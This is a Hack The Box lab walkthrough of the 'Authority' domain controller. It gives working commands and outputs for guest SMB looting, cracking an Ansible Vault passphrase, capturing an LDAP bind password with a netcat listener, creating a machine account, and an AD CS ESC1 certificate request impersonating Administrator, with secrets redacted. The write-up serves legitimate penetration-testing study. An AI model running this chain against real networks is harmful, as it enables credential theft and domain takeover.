---
title: 'HTB Authority: Complete Evidence-Led Walkthrough'
description: An exposed Ansible deployment share and PWM configuration led to LDAP service-account access and an ESC1 certificate path to domain administration.
date: 2026-11-12
category: Windows / Active Directory
difficulty: Not recorded
tags:
- Hack The Box
- Active Directory
- Ansible Vault
- PWM
- LDAP
- AD CS
- ESC1
published: true
slug: htb-authority
---

# Overview

**Machine:** Authority  
**Platform:** Hack The Box  
**Publication format:** htb-authority.md  

The domain controller exposed configuration-management material over a guest-readable SMB share. Configuration files, recovered vault access, and PWM administration provided a foothold before the certificate escalation.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Engagement context from the original record

> **Engagement status:** ROOTED - domain Administrator interactive access verified.  
> **Engagement date:** 26 October 2026  
> **Environment:** Authorized Hack The Box lab, `AUTHORITY`  
> **Initial target:** `10.129.229.56` (before lab reset)  
> **Final target:** `10.129.90.167` (after lab reset)  
> **AD DNS domain:** `authority.htb`  
> **Domain controller:** `authority.authority.htb`  
> **NetBIOS identity observed in Certipy LDAP shell:** `HTB\Administrator`  
> **Final proof:** `[REDACTED_HEX]`

**Handling note:** This public-ready edition retains lab methodology and evidence but masks recovered secrets, hashes, account reset passwords and flag values.

**Evidence standard:** A step is described as *confirmed* only where the supplied terminal output, screenshot, or file excerpt supports it. Where the conversation jumps between two verified states without a captured command, the missing action is explicitly marked **not captured**. This writeup does not use an external solution as a source for the attack chain.

---

### Executive summary

Authority was a Windows Server 2019 Active Directory domain controller hosting DNS, LDAP/LDAPS, SMB, Kerberos, WinRM, IIS, and an Apache Tomcat-hosted PWM Password Self Service application on TCP/8443. The server also published an insecurely accessible SMB `Development` share containing Ansible deployment roles. That share exposed encrypted PWM credentials, historical deployment credentials, and configuration templates.

The attacker recovered the Ansible Vault passphrase and decrypted the PWM configuration credentials, entered PWM's Configuration Manager, downloaded its configuration XML and LocalDB backup, and learned the service account used for LDAP proxy authentication. A live LDAP simple-bind connection then reached an attacker-controlled TCP listener and exposed the `svc_ldap` account password in cleartext. Those credentials were successfully validated against both LDAP and SMB and afforded an Evil-WinRM shell as `svc_ldap`.

No immediate BloodHound path was found from the low-privilege identity. Active Directory Certificate Services enumeration exposed an enabled `CorpVPN` template with ESC1 characteristics: enrollee-supplied subject names, Client Authentication EKU, no manager approval, and enrollment by `Domain Computers`. The user successfully created a computer account (`ENKLAB01$`), enrolled a certificate with the Administrator UPN, and authenticated to LDAP as `HTB\Administrator` through Certipy's Schannel-backed `-ldap-shell` despite PKINIT/TGT authentication returning `KDC_ERR_PADATA_TYPE_NOSUPP`. The final transcript independently confirms an Evil-WinRM session in `C:\Users\Administrator\Documents` and successful retrieval of `root.txt`.

**Outcome:** Confirmed domain Administrator-level LDAP authentication and confirmed interactive Administrator WinRM access, with the root proof captured. The *specific* command bridging the LDAP shell to the successful Administrator WinRM session was not pasted, and must not be reconstructed as a verified fact.

#### Attack chain at a glance

```text
Guest / anonymous SMB
    └── Development\Automation\Ansible\PWM
        └── Ansible Vault blobs → recovered Vault passphrase
            └── PWM Configuration Manager access
                ├── Downloaded PwmConfiguration.xml
                └── Downloaded PWM-LocalDB.bak
                    └── LDAP proxy account identified: svc_ldap
                        └── LDAP simple bind observed at attacker listener :389
                            └── svc_ldap password captured and validated
                                └── Evil-WinRM as svc_ldap
                                    └── AD CS: AUTHORITY-CA / CorpVPN (ESC1)
                                        └── Create ENKLAB01$ computer
                                            └── Enroll Administrator UPN certificate
                                                └── PKINIT fails; LDAPS Schannel works
                                                    └── LDAP shell as HTB\Administrator
                                                        └── [Transition not captured]
                                                            └── Administrator Evil-WinRM → root.txt
```

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Scope and reconnaissance

#### Network reset and working files

An initial scan targeted `10.129.229.56`; unstable VPN connectivity led to a lab reset, after which the target was `10.129.90.167`. The original host's scan and initial service observations were consistent with the subsequently accessed system. Do not treat the old and new addresses as separate compromised hosts.

Working directory at first:

```bash
mkdir -p <REDACTED>
cd ~/CPTS-Prep/10.129.229.56
sudo nmap -Pn -n -sS -p- -T4 --min-rate 1500 --open \
  -oA nmap-alltcp 10.129.229.56
```

The all-port TCP scan showed **29 open ports**:

| Ports | Observation |
|---|---|
| 53 | DNS |
| 80 | Microsoft IIS HTTP |
| 88, 464 | Kerberos and password-change service |
| 135, 139, 445, 593 | RPC/NetBIOS/SMB services |
| 389, 636 | LDAP / LDAPS |
| 3268, 3269 | Global Catalog LDAP / LDAPS |
| 5985, 47001 | Windows Remote Management / HTTPAPI |
| 8443 | HTTPS Tomcat/PWM |
| 9389 | Active Directory Web Services |
| 49664–49667, 49673, 49690–49691, 49693–49694, 49703, 49714, 60297, 64208 | High-port RPC/other services |

Follow-up scan:

```bash
sudo nmap -Pn -n -sC -sV \
  -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49690,49691,49693,49694,49703,49714,60297,64208 \
  -oA nmap-targeted 10.129.229.56
```

Notable fingerprinting results:

- Host: `AUTHORITY`; domain: `authority.htb`; Windows Server 2019 build `17763` reported later by NetExec.
- Port `80`: default `IIS Windows Server` page; HTTP TRACE was reported as potentially risky.
- Port `8443`: Apache Tomcat-based PWM application; HTTPS root returned an HTML meta refresh to `/pwm`.
- SMB message signing: **enabled and required**; SMBv1 disabled.
- Clock discrepancy reported by Nmap: approximately **3 h 59 m 59 s**. This later broke Kerberos TGT acquisition.
- A historical LDAPS certificate visible in Nmap had alternative DNS names under `htb.corp` and a reported end date in 2024; the live environment's trust error must be understood separately, rather than assuming this exact expired certificate was the cause.

```bash
curl -k -i https://10.129.229.56:8443/
```

Result:

```http
HTTP/2 200
content-type: text/html;charset=ISO-8859-1
content-length: 82

<html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
```

**Interpretation:** The `200` response was merely PWM's redirect page. It was not proof that the supplied Tomcat Manager credentials had authenticated.

#### DNS and directory discovery

```bash
dig @10.129.229.56 authority.htb A +noall +answer
dig @10.129.229.56 _ldap._tcp.dc._msdcs.authority.htb SRV +noall +answer
dig @10.129.229.56 authority.htb AXFR
```

Observed:

```text
authority.htb.                          A    10.129.229.56
_ldap._tcp.dc._msdcs.authority.htb.   SRV  0 100 389 authority.authority.htb.
AXFR: Transfer failed.
```

The LDAP RootDSE later confirmed the effective domain name despite certificate metadata mentioning other DNS namespaces:

```bash
ldapsearch -x -H ldap://10.129.90.167 -s base -b '' \
  defaultNamingContext rootDomainNamingContext dnsHostName supportedCapabilities
```

```text
dnsHostName: authority.authority.htb
rootDomainNamingContext: DC=authority,DC=htb
defaultNamingContext: DC=authority,DC=htb
result: 0 Success
```

#### The critical early warning - PWM configuration mode

Opening `https://<target>:8443/pwm/private/login` displayed **Notice - Configuration Mode**. The warning explicitly stated that PWM's configuration could be updated without authenticating to LDAP first and advised using Configuration Manager to restrict unauthorized changes.

> **Referenced evidence (screenshot not supplied):** PWM configuration mode notice (`Authority_Evidence/01-pwm-configuration-mode.png`)

**Major missed opportunity:** The configuration mode warning was discovered during initial web enumeration, yet the full Configuration Manager functionality was not examined promptly. The team pivoted into SMB, Ansible roles, and authentication checks first. Because the eventual foothold relied on information and functionality exposed by PWM, the earlier panel exploration **might have shortened time-to-foothold substantially**. This is a hypothesis about the alternative route, not proof that direct anonymous configuration takeover was available.

## Analysis

The infrastructure secrets did not immediately reveal a high-privilege domain identity. Instead, the tester used the PWM configuration interface and an LDAP bind redirected to a controlled listener to observe the svc_ldap password. BloodHound offered no simple ACL route, but AD CS allowed a computer account to enroll on the CorpVPN template with an Administrator UPN. PKINIT failed, while Schannel-backed LDAP authentication as Administrator succeeded.

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### Initial access avenue: guest-readable SMB Development share

NetExec accepted both null and guest SMB authentication on the original instance; the guest account then accessed the `Development` share successfully on the reset instance.

```bash
netexec smb 10.129.229.56 -u guest -p ''
netexec smb 10.129.229.56 -u '' -p ''
smbclient //10.129.90.167/Development -U 'guest%'
```

The key exposed directory structure was:

```text
Development\
└── Automation\
    └── Ansible\
        ├── ADCS\
        ├── LDAP\
        ├── PWM\
        │   ├── ansible.cfg
        │   ├── ansible_inventory
        │   ├── defaults\main.yml
        │   ├── tasks\main.yml
        │   └── templates\
        │       ├── context.xml.j2
        │       └── tomcat-users.xml.j2
        └── SHARE\
            └── tasks\main.yml
```

Important downloaded material:

**`PWM/ansible_inventory`:**

```yaml
ansible_user: administrator
ansible_password: [REDACTED]
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
```

This was a real cleartext credential in an exposed deployment file, but its actual authentication attempts failed. WinRM reported rejection, and SMB ultimately returned `STATUS_LOGON_FAILURE`. **Do not mark `administrator:[REDACTED]` as a valid credential.**

**`PWM/ansible.cfg`:**

```ini
[defaults]
hostfile = ansible_inventory
remote_user = svc_pwm
```

This was a useful account-name clue, but not proof that `svc_pwm` could authenticate to AD.

**`PWM/templates/tomcat-users.xml.j2`:**

```xml
<user username="admin" password="<REDACTED>" roles="manager-gui"/>
<user username="robot" password="<REDACTED>" roles="manager-script"/>
```

Both Manager endpoints were tested:

```bash
curl -k -i -u 'admin:[REDACTED]' \
  https://10.129.90.167:8443/manager/html
curl -k -i -u 'robot:[REDACTED]' \
  https://10.129.90.167:8443/manager/text/list
```

Both produced the **same 82-byte `/pwm` redirect**; no authenticated Manager interface or application listing was obtained. These accounts were therefore not used for the foothold.

**`PWM/tasks/main.yml`:** the deployment logic downloaded Java, Apache Tomcat, and PWM v2.0.3, then installed the two Tomcat templates and deployed `pwm.war`. That corroborated the application stack.

**`SHARE/tasks/main.yml`:** created `C:\Share` and business-department folders, plus a `User Share`, illustrating additional potential post-compromise locations. No successful read of those private shares was evidenced.

### Offline Ansible Vault credential recovery

#### Discovery and extraction

The file `PWM/defaults/main.yml` contained three Ansible Vault-encrypted YAML values:

```yaml
pwm_admin_login: !vault |
  $ANSIBLE_VAULT;1.1;AES256
  ...
pwm_admin_password: !vault |
  $ANSIBLE_VAULT;1.1;AES256
  ...
ldap_admin_password: !vault |
  $ANSIBLE_VAULT;1.1;AES256
  ...
```

Other settings included:

```yaml
pwm_hostname: authority.htb.corp
ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
```

**File-handling pitfall:** Two different files named `main.yml` were downloaded from separate SMB directories and one replaced the other locally. The later corrected method specified the *second* argument to `smbclient get` as the local destination filename:

```text
smb: \Automation\Ansible\PWM\defaults\> get main.yml pwm-defaults.yml
```

The three Vault blocks were extracted to separate files, each retaining its `$ANSIBLE_VAULT;1.1;AES256` header:

```text
pwm_admin_login.vault
pwm_admin_password.vault
ldap_admin_password.vault
```

#### Password recovery

```bash
ansible2john pwm_admin_login.vault > pwm-vault.hash
```

The first Hashcat invocation, `hashcat -m 16900 pwm-vault.hash /usr/share/wordlists/rockyou.txt`, failed with `Signature unmatched`. The converter output was subsequently inspected. A recovered result displayed the candidate password as a suffix to the `$ansible$...` representation:

```text
$ansible$0*0*...:[REDACTED]
```

The source of the successful recovery operation itself was not pasted in full. What **is** verified is that the password `[REDACTED]` successfully decrypted all three Vault values with `ansible-vault`.

Ansible initially refused to run due to `ISO8859-1` locale settings; the remedy was:

```bash
export LANG=C.UTF-8
export LC_ALL=C.UTF-8
```

The `ansible-vault` command comes from `ansible-core`, not a separate `ansible-vault` APT package.

```bash
ansible-vault view pwm_admin_login.vault --ask-vault-pass
ansible-vault view pwm_admin_password.vault --ask-vault-pass
ansible-vault view ldap_admin_password.vault --ask-vault-pass
```

Recovered values:

| Setting | Plaintext | Evidence / limitations |
|---|---|---|
| Vault passphrase | `[REDACTED]` | Verified decrypting three files |
| `pwm_admin_login` | `svc_pwm` | PWM admin login variable, not automatically an AD user password |
| `pwm_admin_password` | `[REDACTED]` | PWM application/configuration secret |
| `ldap_admin_password` | `[REDACTED]` | Ansible variable; **not** proven to be the live `svc_ldap` password |

**Crucial credential-identity lesson:** Just because a variable is named `ldap_admin_password` does not establish that it belongs to the separately configured live proxy user `svc_ldap`. Both `svc_pwm` credential guesses and the `svc_ldap:[REDACTED]` test led to dead ends or explicit rejection.

### PWM Configuration Manager and exposed backup material

#### Access and application observations

The tester reached the PWM Configuration Manager and its Overview, Certificates, Word Lists, and LocalDB tabs. A screenshot shows:

- Application Mode: **Configuration** (LDAP directory authentication not required to configure).
- Configuration file: `C:\pwm\PwmConfiguration.xml`.
- Application data path: `C:\pwm`.
- Configuration Health: warning that the application was still in configuration mode.
- LDAP Health: LDAPS connection to `authority.authority.htb:636` failing on Java PKIX certificate-chain validation.
- Operations: **Restrict Configuration**, **Import Configuration**, **Download Configuration**, **Configuration Summary**, **Troubleshooting Bundle**, **LDAP Permissions**.

> **Referenced evidence (screenshot not supplied):** PWM Configuration Manager (`Authority_Evidence/03-pwm-configuration-manager.png`)

An incorrect password attempt had earlier produced `5089 ERROR_PASSWORD_ONLY_BAD`; this proved only that the entered value was rejected on that attempt.

> **Referenced evidence (screenshot not supplied):** PWM password error (`Authority_Evidence/02-pwm-configuration-password-error.png`)

The **LDAP Permissions** page also produced a report of *recommended* read/write attributes for the PWM proxy account, such as password writes and reads of `cn`, `mail`, and `sAMAccountName`. It did **not** establish that those ACLs were actually granted to `svc_ldap` or that they could be abused directly. This matters because a permissions *recommendation* is not an access-control *finding*.

> **Referenced evidence (screenshot not supplied):** PWM LDAP permissions recommendations (`Authority_Evidence/05-pwm-ldap-permissions.png`)

**What was and was not observed:** Configuration Manager functionality and export access are shown; the exact successful login POST, accepted secret, and chronological path from first login to configuration privileges were not pasted.

#### LocalDB export and metadata

The LocalDB tab exposed **Download LocalDB** with server path `C:\pwm\LocalDB`; the UI reported 42.13 MB used on disk. The downloaded `PWM-LocalDB.bak` was **3.1 MB**, a gzip file with a reported original size of **22,946,588 bytes**.

> **Referenced evidence (screenshot not supplied):** PWM LocalDB export (`Authority_Evidence/04-pwm-localdb-export.png`)

```bash
file PWM-LocalDB.bak
sha256sum PWM-LocalDB.bak
gzip -t PWM-LocalDB.bak
gzip -dc PWM-LocalDB.bak > PWM-LocalDB.unpacked
strings -a -n 8 PWM-LocalDB.unpacked | head
```

Recorded checksum:

```text
[REDACTED_HEX]  PWM-LocalDB.bak
```

The unpacked content contained CSV-like `PWM_META` and `EVENTLOG_EVENTS` records, including successful and failed login history, `configurationSettingHash`, `lastLdapError`, LocalDB version metadata, and password-history salt information. The `SHAREDHISTORY_META` salt/version were **not** themselves a plaintext LDAP password or a domain password hash.

Most importantly, the live error record named the LDAP proxy account explicitly:

```text
CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
```

The error had the form:

```text
unable to bind to ldaps://authority.authority.htb:636
as CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
reason: CommunicationException; PKIX path building failed:
unable to find valid certification path to requested target
```

**Interpretation:** This was evidence that PWM's Java trust store could not validate the LDAPS certificate during this operation. It was not proof of a wrong service-account password.

#### Exported configuration XML

The downloaded `PwmConfiguration.xml` was approximately **134,146 bytes** and contained:

```xml
<setting key="ldap.proxy.username" ...>
  <value>CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb</value>
</setting>
<setting key="ldap.serverUrls" ...>
  <value>ldaps://authority.authority.htb:636</value>
</setting>
```

`ldap.proxy.password` was present with a **nonempty 115-character value**, but not as ordinary readable plaintext. A local AES decoder was drafted but never demonstrated as successfully decrypting this XML field. Attempts to run it were interrupted by a `Crypto` Python module import failure, and reinstalling the system `python3-pycryptodome` package did not fix the local import. **Do not claim the XML proxy password was decrypted offline.**

The separately browsed LDAP Ansible role was a generic SSSD/PAM integration role: `system_ldap_bind_dn` and `system_ldap_bind_password` defaults were empty. A TODO entry said an LDAP administrator password had been changed after build, but did not disclose the current password.

#### The successful credential capture

A TCP listener was started on the attacker machine:

```bash
sudo nc -lnvp 389
```

Observed evidence:

```text
Listening on 0.0.0.0 389
Connection received on 10.129.90.167 57912
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�[REDACTED]
```

The bytes are consistent with an LDAP simple-bind request: the proxy distinguished name followed by a cleartext password inside binary LDAP protocol framing. Thus the actual live secret was:

```text
Account:  svc_ldap
Password: [REDACTED]
```

**Evidence gap - important:** The conversation records the successful listener and inbound connection but does **not** show the exact PWM UI action or LDAP URL value that caused the remote PWM server to connect to the listener. The most likely mechanism was editing/testing PWM's LDAP endpoint in Configuration Manager to direct a bind to the attacker listener, but the precise click sequence, URL, and save/test operation were **not captured**. This is an inference, not an independently verified reproduction step. Re-run it and capture browser screenshots/Burp requests if an exact reproducible report is required.

**Security significance:** An application administrator able to redirect an LDAP client to a plaintext `ldap://` endpoint can expose the service-account bind password if the application sends an LDAP simple bind. The authentication actually observed on the wire was plaintext; the previous LDAPS/PKIX errors provided context but do not prove the exact downgrade/config-change mechanism on their own.

### Domain foothold: `svc_ldap`

The captured credential worked against both LDAP and SMB:

```bash
netexec ldap 10.129.90.167 -u svc_ldap -p '<REDACTED>'
netexec smb  10.129.90.167 -u svc_ldap -p '<REDACTED>'
```

```text
LDAP  10.129.90.167 AUTHORITY [+] authority.htb\svc_ldap:[REDACTED]
SMB   10.129.90.167 AUTHORITY [+] authority.htb\svc_ldap:[REDACTED]
```

An **Evil-WinRM interactive shell as `svc_ldap`** was subsequently reported and used to run domain queries. The exact original Evil-WinRM invocation and initial `whoami` output were not pasted, but the commands executed at the `C:\Users\svc_ldap\Desktop` prompt substantiate this foothold.

```powershell
net user svc_ldap /domain
net group "Domain Admins" /domain
net group "Domain Computers" /domain
Get-Module -ListAvailable ActiveDirectory
Get-ADUser svc_ldap -Properties MemberOf,ServicePrincipalName,Description,PasswordLastSet |
  Format-List SamAccountName,MemberOf,ServicePrincipalName,Description,PasswordLastSet
```

Verified account properties:

```text
Account active: Yes
Password expires: Never
User may change password: No
Local Group Memberships: Remote Management Users
Global Group Memberships: Domain Users
MemberOf: CN=Remote Management Users,CN=Builtin,DC=authority,DC=htb
ServicePrincipalName: {}
PasswordLastSet: 8/10/2022 9:29:31 PM
```

`Domain Admins` contained `Administrator`. The AD PowerShell module was installed. `svc_ldap` itself was **not** a Domain Admin and had no service principal name. No immediate privilege-escalation path was reported from the BloodHound graph.

#### BloodHound troubleshooting (all errors preserved)

The collector was the legacy BloodHound Python client for BloodHound 4.2/4.3. Early collection attempts:

- Used `svc_pwm` with `[REDACTED]`; direct simple-bind `ldapsearch` returned `invalidCredentials` / `data 52e`.
- Tried to resolve `authority.authority.htb` to `dead:beef::25be:8c42:f719:2cc9`, an IPv6 address unsuitable for the intended IPv4 route.
- FQDN-only `-dc` requirement: passing `10.129.90.167` directly returned an error that the DC must be a hostname.
- With the correct credentials, Kerberos still warned `KRB_AP_ERR_SKEW` - timestamp discrepancy too great - and fell back to NTLM.
- A later attempt used the local default DNS resolver `192.168.165.2`, which timed out instead of using the lab's DNS server.
- `--disable-autogc`, `--auth-method ntlm`, explicit `-ns 10.129.90.167`, and a hosts entry for the FQDN were suggested troubleshooting measures.

The tester later stated **"bloodhound worked too"**. No final successful collection command, dataset manifest, or graph exports were supplied. Therefore mark successful collection **user-reported**, with no specific BloodHound ACL edge independently evidenced in the transcript.

### Active Directory Certificate Services (AD CS) escalation

#### Certificate authority and template discovery

The presence of `ADCS` in the exposed Ansible directory was a strong prompt to enumerate domain Certificate Services even though no useful BloodHound edge had been identified.

```bash
certipy-ad find \
  -u 'svc_ldap@authority.htb' \
  -p '<REDACTED>' \
  -dc-ip 10.129.90.167 \
  -stdout -vulnerable
```

The result identified CA `AUTHORITY-CA` on `authority.authority.htb`, with CA-level **Enroll** granted to `Authenticated Users`, and the enabled template **CorpVPN**:

| CorpVPN property | Observed value | Security meaning |
|---|---|---|
| Enabled | `True` | Published and requestable, subject to permissions |
| Client Authentication | `True` | Certificate can be used for client identity |
| Enrollee Supplies Subject | `True` | Requester controls subject/SAN identity |
| Manager approval | `False` | No approval step |
| Authorized signatures required | `0` | No authorized signature prerequisite |
| Enrollment rights | `Domain Computers`, `Domain Admins`, `Enterprise Admins` | Ordinary domain users **cannot enroll directly** |
| Object control | Admin groups | Not a writable-template ACL path for `svc_ldap` |
| Certipy finding | `ESC1` | Subject impersonation is possible for eligible enrollees |

The CA also showed **User Specified SAN disabled** globally; this is distinct from the *template's* `EnrolleeSuppliesSubject=True`, which is the material ESC1 property in this case.

The presence of `KDC Authentication` in the EKU list and an enabled CA does not guarantee that Kerberos PKINIT will succeed on this DC.

#### Computer-account creation

The first attempt to query machine-account quota failed because this version of NetExec did not recognize `--maq`:

```text
netexec: error: unrecognized arguments: --maq
```

The module-style `-M maq` was then recommended, but **no actual MAQ value was posted**. Instead, the tester proved the relevant capability directly by successfully creating a machine account:

```bash
impacket-addcomputer \
  -computer-name 'ENKLAB01$' \
  -computer-pass '[REDACTED]' \
  -dc-host authority.authority.htb \
  -dc-ip 10.129.90.167 \
  -method LDAPS \
  'authority.htb/svc_ldap:[REDACTED]'
```

```text
[*] Successfully added machine account ENKLAB01$ with password [REDACTED].
```

**Significance:** The user-created computer principal was eligible to enroll in `CorpVPN` through the `Domain Computers` group. The **specific** configured machine-account quota remains unmeasured in this record.

#### Enrollment of an Administrator certificate

```bash
certipy-ad req \
  -u 'ENKLAB01$' \
  -p '<REDACTED>' \
  -target authority.authority.htb \
  -dc-ip 10.129.90.167 \
  -ca AUTHORITY-CA \
  -template CorpVPN \
  -upn 'Administrator@authority.htb'
```

Result:

```text
[*] Requesting certificate via RPC
[*] Request ID is 2
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@authority.htb'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

A certificate **without an object SID** was issued. This is important for interpreting certificate-mapping behavior; it did not stop the subsequent Schannel LDAP authentication in this environment.

#### PKINIT failure, LDAP/Schannel success

The first authentication attempt was:

```bash
certipy-ad auth -pfx administrator.pfx \
  -dc-ip 10.129.90.167 \
  -domain authority.htb
```

Output:

```text
[*] SAN UPN: 'Administrator@authority.htb'
[*] Trying to get TGT...
[-] Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP
```

**Interpretation:** Kerberos certificate preauthentication/TGT acquisition failed; this is **not** evidence that the CA refused the certificate, which had already been issued. Rather than repeatedly attempting PKINIT or assuming the whole ESC1 chain failed, the tester used the LDAP shell mode:

```bash
certipy-ad auth -pfx administrator.pfx \
  -dc-ip 10.129.90.167 \
  -domain authority.htb \
  -ldap-shell
```

In the resulting Certipy LDAP shell:

```text
# whoami
u:HTB\Administrator
# help
  add_computer ...
  add_user_to_group ...
  change_password user [password] ...
  grant_control ...
  set_rbcd ...
  set_shadow_creds ...
  ...
```

**Confirmed:** The certificate was accepted for LDAP authentication as Administrator. The shell's `change_password` operation was available and was recommended as a route to a conventional Windows login.

**Not captured:** The user did not paste the execution or return code of `change_password Administrator ...`; nor was a PsExec session output submitted. Therefore, although a password change is a plausible bridge, this report does **not** state as a verified step that a particular new Administrator password was set or that PsExec was used.

### Final Administrator access and root proof

The final user-provided output independently demonstrates interactive Evil-WinRM access under the Administrator profile and successful retrieval of the final proof:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
[REDACTED_HEX]
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Completed objective:** Domain Administrator-level access with verified final root proof. A separate `user.txt` value was **not** provided; do not invent it. No DCSync, LSASS dump, SAM/SYSTEM/SECURITY hive extraction, domain-wide persistence, or additional hosts were evidenced after Administrator access; do not attribute any of them to this run.

### Dead ends, mistakes, and lessons learned

| Observation or mistake | What happened | Future decision rule |
|---|---|---|
| **PWM panel not explored early** | Configuration-mode warning appeared at first discovery, but enumeration moved to SMB/Ansible | When an app says **configuration/install/setup mode**, inspect its management functions immediately in parallel with enumeration; document what is password-protected, exportable, and editable |
| **VPN instability** | Intermittent SMB timeouts led to repeated resets | Inspect `pgrep -a openvpn`, `ip -br addr`, route before blaming target; two processes were found using the same `.ovpn` profile |
| **Overwriting `main.yml`** | SHARE and PWM role files used identical remote basenames | Always supply a unique local destination to `smbclient get`; mirror remote paths in the local evidence tree |
| **Tomcat auth false positive avoided** | `200 OK` returned only PWM's generic meta refresh | Verify response body and resource-specific functionality; do not equate status 200 with authenticated Manager access |
| **Stale deployment credential** | `administrator:[REDACTED]` rejected by WinRM and SMB | Validate secrets and retain provenance; never reuse a failed guess as a verified foothold |
| **Confusing PWM and AD identities** | `svc_pwm` is a PWM admin variable; live LDAP proxy account is `svc_ldap` | Trace the *exact* bind DN in app config/logs before trying credentials |
| **Misinterpreting PKIX** | PWM could not validate the LDAPS cert | Distinguish TLS trust errors from LDAP `invalidCredentials` (`49` / `52e`) |
| **`pwm-defaults.yml` confusion** | Local filename did not exist until explicitly downloaded under that name | Use `get main.yml pwm-defaults.yml` and confirm `pwd`, `ls`, `file` |
| **Hashcat parser mismatch** | Hashcat mode 16900 emitted `Signature unmatched` | Inspect `ansible2john` output and format before changing tools; verify recovered passphrase by decrypting |
| **Ansible locale** | ISO8859-1 caused Ansible startup failure | `LANG=C.UTF-8 LC_ALL=C.UTF-8` per process; verify `locale charmap` |
| **Python Crypto dependency** | Debian package registered as installed, but Python 3.13 could not import `Crypto` | Use isolated virtualenv or alternate tested interpreter; more important: don't chase this rabbit hole if a cleaner live app route exists |
| **BloodHound DNS/IPv6** | Resolver chose `dead:beef::...`; alternate attempt defaulted to `192.168.165.2` | Set lab DNS explicitly, verify actual A/AAAA lookups, use FQDN for `-dc`, consider IPv4 preference |
| **Kerberos clock skew** | `KRB_AP_ERR_SKEW` broke TGT acquisition | Establish KDC time at the start; NTLM may still function for collection |
| **`--maq` invalid** | NetExec rejected unsupported flag | Inspect version/module list; use `-M maq` where supported, or validate capability with a single permitted creation attempt |
| **ESC1 enrollment eligibility** | CorpVPN only allowed `Domain Computers` and admins | Analyze enrollment ACL and machine-creation rights together; don't assume user can enroll just because Certipy flags ESC1 |
| **PKINIT dead end** | Certificate issued but TGT request returned `KDC_ERR_PADATA_TYPE_NOSUPP` | Pivot to supported certificate-authentication services such as LDAPS/Schannel; distinguish issuance from KDC capabilities |
| **Final transition underdocumented** | Certipy LDAP Admin shell and Admin WinRM both proven, but password-change output missing | Capture every identity-changing action, result, and subsequent authentication in the running report |

#### Highest-value methodology adjustment

**Do not treat a login screen as the entirety of a web application's attack surface.** Especially for configuration and self-service platforms, inspect Setup/Configuration Manager, backups/exports, certificate trust, connection tests, and service integration settings as soon as exposed. In this box, the full SMB/Vault route supplied important context and credentials, but the neglected PWM panel was central to the ultimate domain foothold. The observed path can teach both discovery discipline and when to deprioritize an elaborate detour.

## Impact

Administrator-level LDAP authentication and an interactive Administrator WinRM session with root proof were verified. The exact command bridging the LDAP shell to WinRM is missing and is not reconstructed as observed evidence.

### Evidence register and proof standard

| Evidence ID | Artifact or output | What it proves |
|---|---|---|
| E-01 | `nmap-alltcp.*`, `nmap-targeted.*` | Services, DC indicators, 8443, SMB signing, time skew (original IP) |
| E-02 | `01-pwm-configuration-mode.png` | Configuration-mode warning visible on initial exploration |
| E-03 | SMB console listings | Guest-readable `Development\Automation\Ansible` |
| E-04 | `ansible_inventory`, `ansible.cfg`, `tomcat-users.xml.j2` | Historical credentials and deployment context |
| E-05 | `pwm-defaults.yml` and extracted `.vault` files | Three encrypted values |
| E-06 | `ansible-vault view` plaintext outputs | Vault decryption and PWM/LDAP variable values |
| E-07 | `03-pwm-configuration-manager.png`, `04-pwm-localdb-export.png` | PWM Manager and backup export functionality |
| E-08 | `PWM-LocalDB.bak` / checksum / `PWM-LocalDB.unpacked` | App data and proxy DN/error history |
| E-09 | `PwmConfiguration.xml` settings | Live proxy DN and LDAPS URL; encrypted field presence |
| E-10 | `nc -lnvp 389` listener output | Inbound LDAP simple bind and cleartext `svc_ldap` password |
| E-11 | NetExec successful LDAP and SMB logins | Captured credential valid against domain services |
| E-12 | Evil-WinRM `svc_ldap` PowerShell outputs | Interactive foothold / group membership / account details |
| E-13 | Certipy `find -vulnerable` output | `AUTHORITY-CA`, `CorpVPN` ESC1 conditions |
| E-14 | Impacket `Successfully added machine account` | `ENKLAB01$` created |
| E-15 | Certipy request ID 2 and `administrator.pfx` | Certificate issued for Administrator UPN |
| E-16 | Certipy `auth` error and `-ldap-shell` `whoami` | PKINIT unsupported; Administrator Schannel LDAP auth successful |
| E-17 | Evil-WinRM Administrator `type ..\Desktop\root.txt` | Final root proof |

**Artifacts not provided in this conversation:** original successful PWM Configuration Manager login request, the precise LDAP endpoint-change/test action, exact successful BloodHound CLI execution output or graph ZIP, Administrator password-change execution and success response (if performed), Administrator Evil-WinRM connect command, user flag, or any post-root secrets extraction. These omissions are documentary gaps, not asserted failures of exploitation.

### Final assessment

Authority fell through a compound chain: **overexposed automation files → recovered application configuration credentials → PWM configuration/LDAP bind credential capture → authenticated low-privilege Windows access → machine-account-assisted AD CS ESC1 → Administrator certificate auth via LDAP → verified Administrator Windows session.** Each independently interesting weakness increased the value of the next one.

The standout technical lesson is the distinction between **certificate issuance**, **Kerberos PKINIT capability**, and **LDAP/Schannel certificate authentication**: one failure did not invalidate the other paths. The standout process lesson is equally important: the *first PWM configuration-mode banner deserved immediate deep investigation.* It should be a standard early-app checklist item in future engagements.

**Result:** `AUTHORITY` rooted; final proof recorded; evidence gaps explicitly stated.

## Remediation

